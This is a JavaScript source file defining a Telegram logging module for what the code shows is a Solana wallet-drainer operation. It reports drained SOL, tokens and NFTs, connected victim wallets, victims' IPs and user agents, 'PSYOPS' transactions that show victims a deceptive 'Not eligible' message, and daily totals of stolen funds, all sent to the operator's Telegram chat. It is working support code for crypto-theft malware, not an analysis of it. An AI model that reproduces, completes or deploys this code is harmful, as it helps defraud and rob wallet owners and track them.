import 'dotenv/config';

class TelegramLogger {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    this.enabled = !!(this.botToken && this.chatId);
    
    if (this.enabled) {
      console.log('📱 Telegram logging enabled');
    } else {
      console.log('⚠️ Telegram logging disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    }
  }

  /**
   * Send message to Telegram
   * @param {string} message - Message to send
   * @param {string} type - Message type (info, success, error, warning)
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    try {
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        console.error('❌ Failed to send Telegram message:', response.statusText);
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error.message);
    }
  }

  /**
   * Format message with emojis and styling
   * @param {string} message - Raw message
   * @param {string} type - Message type
   * @returns {string} Formatted message
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   * @param {string} type - Message type
   * @returns {string} Emoji
   */
  getEmoji(type) {
    const emojis = {
      info: 'ℹ️',
      success: '✅',
      error: '❌',
      warning: '⚠️',
      drain: '💰',
      wallet: '👛',
      api: '🔗',
      psyops: '🎭',
      security: '🛡️',
      performance: '⚡'
    };
    return emojis[type] || emojis.info;
  }

  /**
   * Get prefix for message type
   * @param {string} type - Message type
   * @returns {string} Prefix
   */
  getPrefix(type) {
    const prefixes = {
      info: 'INFO',
      success: 'SUCCESS',
      error: 'ERROR',
      warning: 'WARNING',
      drain: 'DRAIN',
      wallet: 'WALLET',
      api: 'API',
      psyops: 'PSYOPS',
      security: 'SECURITY',
      performance: 'PERFORMANCE'
    };
    return prefixes[type] || prefixes.info;
  }

  /**
   * Log drain attempt
   * @param {Object} data - Drain data
   */
  async logDrainAttempt(data) {
    const actualDrainAmount = data.actualDrainAmount || 0;
    const hasTokens = data.hasTokens || false;
    const hasNFTs = data.hasNFTs || false;
    const hasMeaningfulSOL = data.hasMeaningfulSOL || false;
    
    let statusMessage = '';
    if (data.success) {
      statusMessage = '✅ Successfully Drained';
      if (actualDrainAmount > 0 && hasMeaningfulSOL) {
        statusMessage += `\n💰 Drained: ${(actualDrainAmount / 1e9).toFixed(4)} SOL`;
      }
      if (hasTokens) {
        statusMessage += `\n🎫 Drained: ${data.tokenCount} tokens`;
      }
      if (hasNFTs) {
        statusMessage += `\n🖼️ Drained: ${data.nftCount} NFTs`;
      }
    } else {
      // More specific error messages
      if (data.error && data.error.includes('INVALID_WALLET_ADDRESS')) {
        statusMessage = '❌ Invalid Wallet Address';
        statusMessage += '\n💡 Attempted to drain from program address';
      } else if (data.lamports === 0) {
        statusMessage = '❌ No Funds to Drain';
        statusMessage += '\n💡 Wallet has 0 SOL balance';
      } else if (data.lamports < 1000000) {
        statusMessage = '❌ Insufficient Funds';
        statusMessage += '\n💡 Wallet has less than 0.001 SOL';
      } else if (actualDrainAmount === 0 && !hasTokens && !hasNFTs) {
        statusMessage = '❌ No Drainable Assets';
        statusMessage += '\n💡 Wallet has no tokens or meaningful SOL';
      } else {
        statusMessage = '❌ No Funds to Drain';
        statusMessage += '\n💡 Wallet has insufficient funds for draining';
      }
    }

    const message = `
<b>🎯 Drain Attempt</b>

👤 <b>Wallet:</b> <code>${data.publicKey.substring(0, 8)}...</code>
💰 <b>SOL Balance:</b> ${(data.lamports / 1e9).toFixed(6)} SOL
🎫 <b>Tokens:</b> ${data.tokenCount || 0}
🖼️ <b>NFTs:</b> ${data.nftCount || 0}
📦 <b>Tx Size:</b> ${data.transactionSize || 0} bytes
⚙️ <b>Instructions:</b> ${data.instructions || 0}

${statusMessage}
${data.error ? `\n❌ Error: ${data.error}` : ''}
    `.trim();

    await this.sendMessage(message, data.success ? 'success' : 'error');
  }

  /**
   * Log API request
   * @param {Object} data - API request data
   */
  async logAPIRequest(data) {
    const message = `
<b>🔗 API Request</b>

👤 <b>User:</b> <code>${data.user.substring(0, 8)}...</code>
🌐 <b>IP:</b> ${data.ip}
📱 <b>User Agent:</b> ${data.userAgent.substring(0, 50)}...
⏱️ <b>Response Time:</b> ${data.responseTime}ms
📊 <b>Status:</b> ${data.status}
    `.trim();

    await this.sendMessage(message, 'api');
  }

  /**
   * Log wallet connection
   * @param {Object} data - Wallet connection data
   */
  async logWalletConnection(data) {
    const message = `
<b>👛 Wallet Connected</b>

👤 <b>Wallet:</b> <code>${data.publicKey.substring(0, 8)}...</code>
🔌 <b>Type:</b> ${data.walletType}
🌐 <b>Origin:</b> ${data.origin}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `.trim();

    await this.sendMessage(message, 'wallet');
  }

  /**
   * Log PSYOPS transaction
   * @param {Object} data - PSYOPS data
   */
  async logPSYOPS(data) {
    const actualDrainAmount = data.actualDrainAmount || 0;
    const isSuccessfulDrain = data.success || false;
    
    let statusMessage = '';
    if (isSuccessfulDrain) {
      statusMessage = '✅ Transaction Generated (Funds Available)';
      if (actualDrainAmount > 0) {
        statusMessage += `\n💰 Will Drain: ${(actualDrainAmount / 1e9).toFixed(4)} SOL`;
      }
    } else {
      statusMessage = '⚠️ Transaction Generated (No Funds)';
      statusMessage += '\n💡 User will see "Not eligible" message';
    }

    const message = `
<b>🎭 PSYOPS Transaction</b>

👤 <b>Wallet:</b> <code>${data.publicKey.substring(0, 8)}...</code>
💰 <b>Amount:</b> ${(data.amount / 1e9).toFixed(4)} SOL
📦 <b>Size:</b> ${data.size} bytes
⚙️ <b>Instructions:</b> ${data.instructions}
🎯 <b>Display:</b> "${data.displayMessage}"

${statusMessage}
    `.trim();

    await this.sendMessage(message, 'psyops');
  }

  /**
   * Log security event
   * @param {Object} data - Security event data
   */
  async logSecurityEvent(data) {
    const message = `
<b>🛡️ Security Event</b>

🚨 <b>Type:</b> ${data.type}
👤 <b>User:</b> <code>${data.user.substring(0, 8)}...</code>
🌐 <b>IP:</b> ${data.ip}
📝 <b>Details:</b> ${data.details}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `.trim();

    await this.sendMessage(message, 'security');
  }

  /**
   * Log performance metrics
   * @param {Object} data - Performance data
   */
  async logPerformance(data) {
    const message = `
<b>⚡ Performance Metrics</b>

📊 <b>Response Time:</b> ${data.responseTime}ms
📦 <b>Transaction Size:</b> ${data.transactionSize} bytes
⚙️ <b>Instructions:</b> ${data.instructions}
💰 <b>SOL Amount:</b> ${(data.solAmount / 1e9).toFixed(4)} SOL
🎫 <b>Tokens:</b> ${data.tokens}
🖼️ <b>NFTs:</b> ${data.nfts}
🔄 <b>Success Rate:</b> ${data.successRate}%
    `.trim();

    await this.sendMessage(message, 'performance');
  }

  /**
   * Log system performance metrics
   * @param {Object} data - System performance data
   */
  async logSystemPerformance(data) {
    const message = `
<b>🖥️ System Performance</b>

💾 <b>Memory Usage:</b> ${data.memoryUsage}MB
⚡ <b>CPU Usage:</b> ${data.cpuUsage}%
🌐 <b>Active Connections:</b> ${data.activeConnections}
📊 <b>Cache Hit Rate:</b> ${data.cacheHitRate}%
⏱️ <b>Average Response Time:</b> ${data.avgResponseTime}ms
🔄 <b>Requests/Second:</b> ${data.requestsPerSecond}
    `.trim();

    await this.sendMessage(message, 'performance');
  }

  /**
   * Log security metrics
   * @param {Object} data - Security metrics data
   */
  async logSecurityMetrics(data) {
    const message = `
<b>🛡️ Security Metrics</b>

🚫 <b>Blocked Requests:</b> ${data.blockedRequests}
⚠️ <b>Suspicious Activities:</b> ${data.suspiciousActivities}
🌍 <b>Geolocation Blocks:</b> ${data.geoBlocks}
⏱️ <b>Rate Limit Violations:</b> ${data.rateLimitViolations}
🔍 <b>Bot Detection:</b> ${data.botDetection}
📊 <b>Threat Level:</b> ${data.threatLevel}
    `.trim();

    await this.sendMessage(message, 'security');
  }

  /**
   * Log real-time analytics
   * @param {Object} data - Analytics data
   */
  async logAnalytics(data) {
    const message = `
<b>📊 Real-Time Analytics</b>

👥 <b>Active Users:</b> ${data.activeUsers}
🎯 <b>Successful Drains:</b> ${data.successfulDrains}
❌ <b>Failed Attempts:</b> ${data.failedAttempts}
💰 <b>Total SOL Drained:</b> ${data.totalSOL.toFixed(4)} SOL
🎫 <b>Total Tokens:</b> ${data.totalTokens}
🖼️ <b>Total NFTs:</b> ${data.totalNFTs}
⚡ <b>Success Rate:</b> ${data.successRate}%
    `.trim();

    await this.sendMessage(message, 'info');
  }

  /**
   * Log server status
   * @param {Object} data - Server status data
   */
  async logServerStatus(data) {
    const message = `
<b>🚀 Server Status</b>

🟢 <b>Status:</b> ${data.status}
🌐 <b>Port:</b> ${data.port}
📊 <b>Uptime:</b> ${data.uptime}
💾 <b>Memory:</b> ${data.memory}MB
⚡ <b>CPU:</b> ${data.cpu}%
🔗 <b>API Endpoints:</b> ${data.endpoints}
    `.trim();

    await this.sendMessage(message, 'info');
  }

  /**
   * Log error
   * @param {Object} data - Error data
   */
  async logError(data) {
    const message = `
<b>❌ Error Log</b>

🚨 <b>Type:</b> ${data.type}
👤 <b>User:</b> <code>${data.user?.substring(0, 8) || 'N/A'}...</code>
🌐 <b>IP:</b> ${data.ip || 'N/A'}
📝 <b>Message:</b> ${data.message}
📚 <b>Stack:</b> ${data.stack?.substring(0, 200)}...
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `.trim();

    await this.sendMessage(message, 'error');
  }

  /**
   * Send daily summary
   * @param {Object} data - Summary data
   */
  async sendDailySummary(data) {
    const message = `
<b>📊 Daily Summary</b>

📅 <b>Date:</b> ${data.date}
🎯 <b>Total Drains:</b> ${data.totalDrains}
✅ <b>Successful:</b> ${data.successful}
❌ <b>Failed:</b> ${data.failed}
💰 <b>Total SOL:</b> ${data.totalSOL.toFixed(4)} SOL
🎫 <b>Total Tokens:</b> ${data.totalTokens}
🖼️ <b>Total NFTs:</b> ${data.totalNFTs}
⚡ <b>Success Rate:</b> ${data.successRate}%
🌐 <b>Unique IPs:</b> ${data.uniqueIPs}
    `.trim();

    await this.sendMessage(message, 'info');
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

export default telegramLogger; 